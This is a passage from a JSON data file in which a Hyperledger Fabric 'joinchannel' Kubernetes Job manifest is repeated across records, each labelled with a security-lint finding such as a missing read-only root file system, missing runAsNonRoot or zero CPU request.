sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel3\" does not have a read-only root file system"
  },
  {
    "id": "1927",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel4\" does not have a read-only root file system"
  },
  {
    "id": "1928",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel1\" is not set to runAsNonRoot"
  },
  {
    "id": "1929",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel2\" is not set to runAsNonRoot"
  },
  {
    "id": "1930",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel3\" is not set to runAsNonRoot"
  },
  {
    "id": "1931",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel4\" is not set to runAsNonRoot"
  },
  {
    "id": "1932",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel1\" has cpu request 0"
  },
  {
    "id": "1933",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
